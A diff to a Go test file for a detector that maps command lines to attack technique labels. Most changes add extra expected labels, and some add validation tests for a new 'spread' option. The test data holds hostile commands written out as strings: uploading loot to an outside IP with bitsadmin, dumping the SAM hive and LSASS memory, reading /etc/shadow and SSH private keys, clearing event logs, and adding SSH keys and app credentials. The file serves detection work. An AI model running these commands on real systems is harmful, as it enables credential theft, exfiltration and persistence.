@@ -42,7 +42,7 @@ func TestDetect(t *testing.T) {
 		{"app role rest", "POST https://graph.microsoft.com/v1.0/servicePrincipals/1f2e/appRoleAssignments", []string{"AppRoleAssignment"}},
 		{"app role assigned to", `Invoke-MgGraphRequest -Method POST -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$id/appRoleAssignedTo" -Body $b`, []string{"AppRoleAssignment"}},
 		{"app role cmdlet", "New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp -PrincipalId $sp -ResourceId $graph -AppRoleId $role", []string{"AppRoleAssignment"}},
-		{"app role read", "curl -s https://graph.microsoft.com/v1.0/servicePrincipals/1f2e/appRoleAssignments", []string{"GraphDirectoryEnumeration"}},
+		{"app role read", "curl -s https://graph.microsoft.com/v1.0/servicePrincipals/1f2e/appRoleAssignments", []string{"GraphDirectoryEnumeration", "CloudServiceDiscovery"}},
 		{"consent grant", "az ad app permission admin-consent --id $APP", []string{"AppRoleAssignment"}},
 		{"add password rest", "curl -X POST https://graph.microsoft.com/v1.0/applications/77aa/addPassword -d '{}'", []string{"AppCredentialAddition"}},
 		{"add password cmdlet", "Add-MgApplicationPassword -ApplicationId $app", []string{"AppCredentialAddition"}},
@@ -125,20 +125,20 @@ func TestDetectWindows(t *testing.T) {
 		{"dll export", `rundll32.exe C:\Users\Public\a.dll,Start`, []string{"SignedBinaryProxyExecution"}},
 		{"inline task", `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Users\Public\b.xml`, []string{"SignedBinaryProxyExecution"}},
 		{"run key by reg", `reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v U /d x /f`, []string{"RunKeyPersistence"}},
-		{"run key read", `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, []string{"RegistryQuery"}},
+		{"run key read", `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, []string{"RegistryQuery", "BackupSoftwareDiscovery"}},
 		{"bits upload", `bitsadmin /transfer j /upload http://198.51.100.7/in C:\loot.zip`, []string{"FileUpload"}},
 		{"web client upload", `$wc.UploadFile($u, "C:\loot.zip")`, []string{"FileUpload"}},
 		{"run key by .net", `[Microsoft.Win32.Registry]::CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", $true).SetValue("U", "x")`, []string{"RunKeyPersistence"}},
 		{"task created", `schtasks.exe /create /tn U /tr x /sc onlogon`, []string{"ScheduledTaskCreation"}},
 		{"tasks listed", `schtasks /query /fo list`, nil},
 		{"service created", `sc.exe \\dc01 create U binPath= x`, []string{"ServiceCreation"}},
-		{"services listed", `sc query`, []string{"ServiceDiscovery"}},
+		{"services listed", `sc query`, []string{"ServiceDiscovery", "SecuritySoftwareDiscovery", "BackupSoftwareDiscovery"}},
 		{"log cleared", `wevtutil cl Security`, []string{"EventLogClearing"}},
 		{"log read", `wevtutil qe Security /c:5`, []string{"LogEnumeration"}},
 		{"hive saved", `reg save HKLM\SAM C:\Users\Public\s.hiv`, []string{"RegistryHiveDump"}},
 		{"memory dump", `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\l.dmp full`, []string{"SignedBinaryProxyExecution", "LsassDump"}},
 		{"scan interface", `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`, []string{"AmsiBypass"}},
-		{"ldap search", `$s = New-Object System.DirectoryServices.DirectorySearcher([adsi]"")`, []string{"DirectorySearch"}},
+		{"ldap search", `$s = New-Object System.DirectoryServices.DirectorySearcher([adsi]"")`, []string{"DirectorySearch", "AccountEnumeration"}},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -167,13 +167,13 @@ var linuxCases = []struct {
 	{`systemctl enable --now sync.timer`, []string{"ScheduledJobCreation"}},
 	{`cp sync.service /etc/systemd/system/sync.service`, []string{"SystemdUnitCreation"}},
 	{`systemctl enable --now sync.service`, []string{"SystemdUnitCreation"}},
-	{`systemctl status sshd`, []string{"ServiceDiscovery"}},
+	{`systemctl status sshd`, []string{"ServiceDiscovery", "SecuritySoftwareDiscovery"}},
 	{`service --status-all`, []string{"ServiceDiscovery"}},
 	{`systemctl restart sshd`, nil},
 	{`useradd -m -s /bin/bash svc`, []string{"AccountCreation"}},
 	{`net user svc "$P" /add`, []string{"AccountCreation"}},
 	{`New-LocalUser -Name svc`, []string{"AccountCreation"}},
-	{`net user`, []string{"LocalAccountEnumeration"}},
+	{`net user`, []string{"LoggedOnUserDiscovery", "LocalAccountEnumeration"}},
 	{`echo "$KEY" >> ~/.ssh/authorized_keys`, []string{"SshKeyPersistence"}},
 	{`ssh-copy-id -i k.pub user@10.0.0.5`, []string{"SshKeyPersistence"}},
 	{`cat ~/.ssh/authorized_keys`, nil},
@@ -203,7 +203,7 @@ var linuxCases = []struct {
 
 	{`cat /etc/shadow > s.txt`, []string{"ShadowFileRead"}},
 	{`unshadow p s > u`, []string{"ShadowFileRead"}},
-	{`cat /etc/passwd`, []string{"LocalAccountEnumeration"}},
+	{`cat /etc/passwd`, []string{"LoggedOnUserDiscovery", "AccountEnumeration", "LocalAccountEnumeration"}},
 	{`cat ~/.ssh/id_rsa`, []string{"PrivateKeyRead"}},
 	{`cp /etc/ssh/ssh_host_rsa_key .`, []string{"PrivateKeyRead"}},
 	{`cat ~/.ssh/id_rsa.pub`, nil},
@@ -341,7 +341,7 @@ func TestDetectKeepsTableOrder(t *testing.T) {
 		t.Errorf("Detect = %q, want %q", got, want)
 	}
 	hits := table.Detect(text)
-	if !slices.Equal(hits[0].Attack, []string{"T1098.001"}) || !slices.Equal(hits[1].Attack, []string{"T1580"}) {
+	if !slices.Equal(hits[0].Attack, []string{"T1098.001"}) || !slices.Equal(hits[1].Attack, []string{"T1580", "T1526"}) {
 		t.Errorf("techniques = %q and %q, want those of the data file", hits[0].Attack, hits[1].Attack)
 	}
 	visited := 0
@@ -458,6 +458,9 @@ func TestDecodeRejects(t *testing.T) {
 	if _, err := decode([]byte(one(`"context":"c","paths":["a"]`))); err != nil {
 		t.Fatalf("a table of paths only: %v", err)
 	}
+	if _, err := decode([]byte(one(`"patterns":["a"],"spread":{"least":2,"patterns":["(?P<to>abc)(?P<at>d)"]}`))); err != nil {
+		t.Fatalf("a table with a spread: %v", err)
+	}
 	tests := map[string]string{
 		"not json":                        `{`,
 		"no activities":                   `{"contexts":{},"activities":[]}`,
@@ -475,6 +478,11 @@ func TestDecodeRejects(t *testing.T) {
 		"paths, no context":               one(`"paths":["a"]`),
 		"context, no paths":               one(`"patterns":["a"],"context":"c"`),
 		"an unknown context":              one(`"context":"d","paths":["a"]`),
+		"a spread without a pattern":      one(`"patterns":["a"],"spread":{"least":10,"patterns":[]}`),
+		"a spread of one":                 one(`"patterns":["a"],"spread":{"least":1,"patterns":["(?P<to>a)(?P<at>b)"]}`),
+		"a spread without its groups":     one(`"patterns":["a"],"spread":{"least":10,"patterns":["(a)(b)"]}`),
+		"a spread with a third group":     one(`"patterns":["a"],"spread":{"least":10,"patterns":["(?P<to>a)(?P<at>b)(c)"]}`),
+		"a spread that does not compile":  one(`"patterns":["a"],"spread":{"least":10,"patterns":["("]}`),
 		"a subject without a label":       one(`"patterns":["a"],"subjects":[{"pattern":"(a)"}]`),
 		"a subject without a group":       one(`"patterns":["a"],"subjects":[{"label":"l","pattern":"a"}]`),
 		"a subject with two groups":       one(`"patterns":["a"],"subjects":[{"label":"l","pattern":"(a)(b)"}]`),
@@ -569,7 +577,7 @@ var shareCases = []struct {
 	{`showmount -e 10.20.1.40`, []string{"NetworkShareDiscovery"}},
 	{`nmap --script smb-enum-shares -p445 10.20.1.5`, []string{"NetworkShareDiscovery"}},
 	{`Snaffler.exe -s -o snaffler.log`, []string{"NetworkShareDiscovery"}},
-	{`net view`, []string{"RemoteSystemDiscovery"}},
+	{`net view`, []string{"NetworkShareDiscovery", "RemoteSystemDiscovery"}},
 	{`net share loot=C:\loot /grant:everyone,full`, nil},
 	{`smbmap -H 10.20.1.17 -u svc -p "$P" -x 'whoami'`, nil},
 	{`enum4linux -U 10.20.1.5`, nil},
